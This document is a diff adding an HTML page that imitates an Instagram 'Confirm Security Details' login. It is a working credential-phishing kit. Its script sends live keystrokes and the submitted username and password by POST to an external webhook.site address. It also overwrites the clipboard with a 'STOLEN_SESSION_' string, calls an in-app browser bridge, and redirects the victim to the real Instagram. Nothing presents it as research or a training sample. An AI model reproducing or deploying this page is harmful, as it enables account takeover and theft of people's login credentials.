@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram Security Sync</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: -apple-system, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 100%; max-width: 350px; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; }
+        .btn { background: #0095f6; color: white; border: none; padding: 10px; width: 100%; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        #log { font-size: 10px; color: #999; margin-top: 20px; text-align: left; font-family: monospace; overflow-wrap: break-word; }
+    </style>
+</head>
+<body>
+
+    <div class="login-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" width="60" style="margin-bottom: 20px;">
+        <h2 style="font-size: 17px; color: #262626;">Confirm Security Details</h2>
+        <p style="font-size: 14px; color: #8e8e8e;">Verify your account details to continue.</p>
+        
+        <input type="text" id="user" name="email" placeholder="Email or Username" autocomplete="email">
+        <input type="password" id="pass" name="password" placeholder="Password" autocomplete="current-password">
+        
+        <button class="btn" onclick="triggerImpact()">Verify Account</button>
+        <div id="log">Bridge Status: Monitoring...</div>
+    </div>
+
+    <script>
+        const webhookURL = "https://webhook.site/ccc5a516-132a-4a1b-9d20-dc323e820bd3";
+
+        function logToScreen(msg) {
+            document.getElementById('log').innerHTML += "<br>> " + msg;
+        }
+
+        // POST Data Function
+        async function exfiltrate(data) {
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({
+                        timestamp: new Date().toLocaleString(),
+                        browser: navigator.userAgent,
+                        content: data
+                    })
+                });
+                logToScreen("Data exfiltrated via POST.");
+            } catch (e) {
+                logToScreen("POST Failed: " + e);
+            }
+        }
+
+        // AUTO-CAPTURE (Jaise hi user Autofill select karega)
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('input', () => {
+                if (input.value.length > 3) {
+                    logToScreen("Capturing " + input.id + "...");
+                    exfiltrate({ type: "autofill_live", field: input.id, value: input.value });
+                }
+            });
+        });
+
+        async function triggerImpact() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+
+            // Bridge Interaction
+            if (window.iabjs_unified_bridge) {
+                window.iabjs_unified_bridge.postMessage(JSON.stringify({action: "log_event", info: "verification_click"}));
+            }
+
+            // Clipboard Hijack (Based on your successful screenshot)
+            try {
+                await navigator.clipboard.writeText("STOLEN_SESSION_" + btoa(u));
+                logToScreen("Clipboard modified.");
+            } catch(e) {}
+
+            // Final POST
+            await exfiltrate({
+                type: "full_submission",
+                username: u,
+                password: p,
+                local_leak: "storage/emulated/0/..."
+            });
+
+            alert("Security Synced.");
+            window.location.href = "https://instagram.com";
+        }
+    </script>
+</body>
+</html>
